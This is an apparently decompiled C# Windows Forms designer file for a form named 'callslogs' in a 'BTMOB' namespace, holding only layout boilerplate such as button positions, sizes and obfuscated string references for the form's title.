using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class callslogs : basestyle
{
	private IContainer components;

	public callslogs()
	{
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(314, 5);
		this.minibtn.Location = new System.Drawing.Point(356, 5);
		this.closbtn.Location = new System.Drawing.Point(398, 5);
		this.mytitle.Size = new System.Drawing.Size(430, 19);
		this.tobpanelsti.Size = new System.Drawing.Size(440, 29);
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 20f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(444, 772);
		base.Name = EXGuarder._75045F36;
		this.Text = EXGuarder._75045F36;
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		base.ResumeLayout(false);
	}
}
